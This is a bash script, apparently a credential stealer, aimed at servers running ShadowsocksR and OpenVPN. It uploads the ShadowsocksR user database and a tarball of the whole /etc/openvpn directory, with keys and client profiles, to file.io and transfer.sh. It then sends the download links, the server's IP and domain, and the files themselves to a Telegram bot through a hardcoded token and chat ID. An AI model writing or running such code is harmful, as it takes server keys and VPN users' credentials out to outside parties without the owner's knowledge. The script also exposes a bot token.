#!/bin/bash

link="$(curl -F "file=@/usr/local/shadowsocksr/mudb.json" "https://file.io" | jq ".link")"

kf="$(curl -H "Max-Downloads: 100" -H "Max-Days: 50" --upload-file /usr/local/shadowsocksr/mudb.json https://transfer.sh)"

id=-4162859258

domainopen=$(cat /etc/openvpn/server/client-common.txt | sed -n 4p | cut -d ' ' -f 2)

domain=$(cat /usr/local/shadowsocksr/userapiconfig.py | grep "SERVER_PUB_ADDR = " | awk -F "[']" '{print $2}')

ip=$(curl ifconfig.me)

if [ -e /usr/local/shadowsocksr/mudb.json ]

then

wget -qO /dev/null "https://api.telegram.org/bot6971298468:AAF_OsyYhK5cFJSFVvHopnF1TKGL_raP-1w/sendMessage?chat_id=$id&text=$ip+$domain+ShadowSocks+$kf+$link"

else

echo Bad

fi

if [ -e /usr/local/shadowsocksr/mudb.json ]

then

curl -F "chat_id=$id" -F document=@/usr/local/shadowsocksr/mudb.json https://api.telegram.org/bot6971298468:AAF_OsyYhK5cFJSFVvHopnF1TKGL_raP-1w/sendDocument?caption=$domain

else

echo Bad

fi

cp /root/*.ovpn /etc/openvpn

cd /etc

tar -czvf "openvpn.tar.gz" "openvpn"

linkopen="$(curl -H "Max-Downloads: 100" -H "Max-Days: 50" --upload-file /etc/openvpn.tar.gz https://transfer.sh)"
linkf="$(curl -F "file=@/etc/openvpn.tar.gz" "https://file.io" | jq ".link")"

if [ -e /etc/openvpn/server/server.conf ]

then

wget -qO /dev/null "https://api.telegram.org/bot6971298468:AAF_OsyYhK5cFJSFVvHopnF1TKGL_raP-1w/sendMessage?chat_id=$id&text=$ip+$domainopen+OpenVPN+$linkopen+$linkf"

else

echo Bad

fi

if [ -e /etc/openvpn/server/server.conf ]

then

curl -F "chat_id=$id" -F document=@/etc/openvpn.tar.gz https://api.telegram.org/bot6971298468:AAF_OsyYhK5cFJSFVvHopnF1TKGL_raP-1w/sendDocument?caption=$domainopen

else

echo Bad

fi

rm /etc/openvpn.tar.gz
